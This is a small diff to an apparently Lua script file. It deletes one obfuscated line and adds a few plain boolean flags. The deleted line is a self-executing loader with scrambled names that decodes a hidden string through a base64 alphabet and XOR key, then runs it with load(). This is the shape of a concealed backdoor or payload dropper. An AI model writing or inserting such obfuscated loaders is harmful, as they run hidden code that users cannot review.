@@ -1,1 +1,5 @@
-(function()local __0O10oo10oO0o1olIoo="yxzGf/H8vAficYgwZOnAuZOMClc51VF4O3vAficYZ7cYfD0dHdNkLsz" local __O11lIIll1ooOoIOlI0="9YVglKbNRtmW9xzI5kszWh380P" local __OlO0IOOIoO1II0l0l1=622 local _0001lO1o101Ool0oOl=865 local ___OoO1Olll10Io01llOl=607 local _0I00OlI1Ool0O0IoII=970 local ___IOolO111l1Oo0O0oOl=8 local function ___oO1ooololo0l1o0lIo(__0O10oo10oO0o1olIoo,__O11lIIll1ooOoIOlI0)local __l010oO0OIOl1llOOIo="" local __IIOIoo0IIO1O0I0OIl="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" local _I0IIII01I1ool01IIO={}for ___l111oll0ll1IlOlIOo=1,#__0O10oo10oO0o1olIoo do local c=__0O10oo10oO0o1olIoo:sub(___l111oll0ll1IlOlIOo,___l111oll0ll1IlOlIOo)for j=1,#__IIOIoo0IIO1O0I0OIl do if __IIOIoo0IIO1O0I0OIl:sub(j,j)==c then table.insert(_I0IIII01I1ool01IIO,j-1)break end end end for ___l111oll0ll1IlOlIOo=1,#_I0IIII01I1ool01IIO do local v=_I0IIII01I1ool01IIO[___l111oll0ll1IlOlIOo]local k=__O11lIIll1ooOoIOlI0:byte(((___l111oll0ll1IlOlIOo-1)%#__O11lIIll1ooOoIOlI0)+1)__l010oO0OIOl1llOOIo=__l010oO0OIOl1llOOIo..string.char(bit32 and bit32.bxor(v,k)or v~k)end return __l010oO0OIOl1llOOIo end local _I0IIII01I1ool01IIO=___oO1ooololo0l1o0lIo(__0O10oo10oO0o1olIoo,__O11lIIll1ooOoIOlI0)assert(load(_I0IIII01I1ool01IIO))()end)()
+Kheaster = true
+ZyleTzy1= true
+
+crisly = true
+crislycute = true
